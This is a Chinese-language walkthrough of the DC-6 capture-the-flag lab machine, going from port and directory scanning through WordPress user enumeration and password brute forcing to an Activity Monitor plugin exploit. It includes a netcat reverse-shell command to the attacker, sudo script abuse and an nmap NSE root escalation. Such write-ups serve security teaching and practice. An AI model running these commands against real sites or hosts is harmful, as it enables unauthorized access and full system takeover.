靶机描述  

dc-6靶机目标，获取root权限并读取theflag.txt

提示 cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt

目标信息

靶机ip:192.168.150.68

测试过程

信息收集

1.nmap扫描端口，开放22、25、80、110端口。﻿

![](../Images/572bb935a4a6186a7ef16b96411540b1.png)

2.dirb扫描目录。看目录名称，该建站系统应该是wordpress。

![](../Images/dd1a949b74dd5dd78a090ac0fc125a17.png)

3.wordpress可以使用wpscan来查看用户，命令wpscan --url http://wordy/ --enumerate u  

![](../Images/950eb397ffc0585c9c81f40edb2bfd7b.png)

提权过程

1.先尝试爆破，看看能不能登录后台。根据提示制作字典，用来爆破wordpress用户。直接执行命令cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt，然后将用户保存到user.txt里面。然后开始爆破。爆破命令wpscan http://wordy/ -U user.txt -P passwords.txt。发现了一个用户，可以登录后台啦。

![](../Images/c476f84003e2eeffb08b0d23bc2e6e95.png)

2.wordpress后台插件漏洞很多。我们发现了Activity monitor，然后kali中搜索插件漏洞searchsploit Activity monitor 。

![](../Images/b1bda3a6adb6f5e9a2cc0e7d8f33ed4d.png)

﻿﻿3.找到漏洞exp以后将它复制到/root/目录下，然后进行简单修改。复制命令cp /usr/share/exploitdb/exploits/php/webapps/45274.html /root/。修改exp中的域名和监听命令。将localhost:8000换成wordy。将nc -nlvp 127.0.0.1 9999 -e /bin/bash 换成nc ip port -e /bin/bash

![](../Images/56bf61316e77eed297aa2079a9ca92e2.png)

﻿﻿4.然后在操作机上开启监听

![](../Images/50e1e3fc644b950aff453e9a98ad237d.png)

5.然后在浏览器中打开45274.html，并点击submit request。然后shell上线。然后执行python -c 'import pty;pty.spawn("/bin/bash")'将它变成交互式的shell。

![](../Images/e40bb4224667648acca0992f6bfc221c.png)

6.然后在/home/mark/stuff/目录下发现一个txt文件，在其中记录了graham用户密码。

![](../Images/7978cad1b80e829a327b99e41ff50f04.png)

7.然后在xshell中登录。在/home/jens/下发现 back.sh，而且当前用户（graham）可以以jens用户的身份运行。然后就在该脚本中添加命令echo "/bin/bash" >> back.sh。运行以后就获得了jens用户权限。

![](../Images/173a8906e462cd30a766adf9f46934ad.png)

8.然后查看jens用户可以以root用户身份执行nmap，然后使用namp提权。

![](../Images/565fa490f93b2a4e55417e3877e3508e.png)

9.先将命令echo 'os.execute("/bin/sh")' > 111.nse插入111.nse，然后在输出的shell里面执行命令python -c "import pty;pty.spawn('/bin/bash')" 。将获得的shell变成一个交互式的shell。这样就获得了root权限，然后跳转root目录，读取theflag.txt。

![](../Images/d0dd80aac1db0d387b4f6a1897f72037.png)
